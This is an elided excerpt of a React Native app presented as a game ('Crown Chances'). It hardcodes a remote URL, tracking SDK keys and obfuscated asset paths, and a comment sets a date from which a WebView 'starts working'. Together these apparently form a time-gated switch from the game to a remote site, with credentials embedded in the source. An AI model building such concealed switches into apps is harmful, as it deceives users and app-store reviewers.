...
import CrownChancesProdScr from './screens/CrownChancesProdScr';
...
const App = () => {
      ...
      const INITIAL_URL = `https://exquisite-esteemed-blessing.space/`;
      const URL_IDENTIFAIRE = `qM8iHfTC`;
                  ...
                  if (jsonData !== null) {
                        ...
                        const results = await Promise.all([
                              FBDeepLink.initialize(
                                    '1218206396508554',
                                    '1650092f74cb537dc208b8925169605f',
                              ),
      ...
      OneSignal.initialize('a211b431-c7f5-4dd4-8e9d-1e5973accfd2');
                        ...
                        appsFlyer.initSdk(
                              {
                                    ...
                                    appId:
                                          'com.crown.adventure.funny.entertainment.australia.game.crownchance',
                                    isDebug: true,
      ...
      useEffect(() => {
            ...
            const targetData = new Date('2025-06-07T12:00:00'); //дата з якої поч працювати webView
                  ...
                  return (
                        <Stack.Navigator>
                              <Stack.Screen
                                    ...
                                    name="CrownChancesProdScr"
                                    component={CrownChancesProdScr}
            ...
            <NavigationContainer>
                  {!louderIsEnded ? (
                        <View
                              ...
                              <Animated.Image
                                    source={require('./jxwoencwnevwrne/alkmmdwmwem/louder1.jpg')}
                                    style={{
                                          //...props.style,
